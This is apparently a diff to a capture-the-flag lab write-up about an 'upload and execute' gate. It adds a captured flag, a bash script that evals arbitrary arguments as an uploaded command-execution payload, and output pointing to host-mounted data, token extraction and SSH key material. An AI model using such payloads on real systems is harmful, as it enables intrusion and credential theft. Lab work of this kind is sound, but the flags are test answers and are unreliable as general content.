@@ -118,8 +118,56 @@ done
 # Gate 2: What Does Upload and Execute Actually Do?
 
 ## Flags
+1. GRANITE-BRIDGE
+2. 
 
- - What paths or labels does the web page reveal for uploaded files and remote execution?
+- What paths or labels does the web page reveal for uploaded files and remote execution?
 - If you upload a small diagnostic payload, what does its output prove about where it ran?
 - What output fields or response text are different from local web-shell command output?
 - Which discovered hints point toward mounted data, missing-tool adaptation, scoped request/response behavior, or later movement?
+
+shell script:
+`cmd <command to run>`
+```
+#!/bin/bash
+
+# Check if at least one argument was passed
+if [ $# -eq 0 ]; then
+    echo "Error: No command provided.'Usage: $0 <command>"
+	exit 1
+fi
+        
+# Combine all script arguments into a single command string
+COMMAND="$*"
+        
+# Run the command and capture output & error
+OUTPUT=$(eval "$COMMAND" 2>&1)
+STATUS=$?
+        
+# Print results
+if [ $STATUS -eq 0 ]; then
+	echo "$OUTPUT"
+else
+	echo "Error: Command failed with exit code $STATUS."
+	echo "Details:"
+        echo "$OUTPUT"
+fi
+
+```
+cat /srv/archive/reports/maintenance-readme.txt
+```
+source=exec-container
+exit_code=0
+mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
+limited_tooling_hint=extract-token-from-man-source
+man_source=/usr/share/man/man7/ops-runtime.7.gz
+man_validator=/opt/ops/tools/check-man-evidence
+ssh_artifacts=/opt/ops/ssh-materials
+stdout=Maintenance archive notes:
+- This path is host-mounted into the container for maintenance workflows.
+- Verify mounted path context before trusting data boundaries.
+- mounted_path_flag=GRANITE-BRIDGE
+- ssh_artifact_hint=/opt/ops/ssh-materials
+stderr=
+```
+
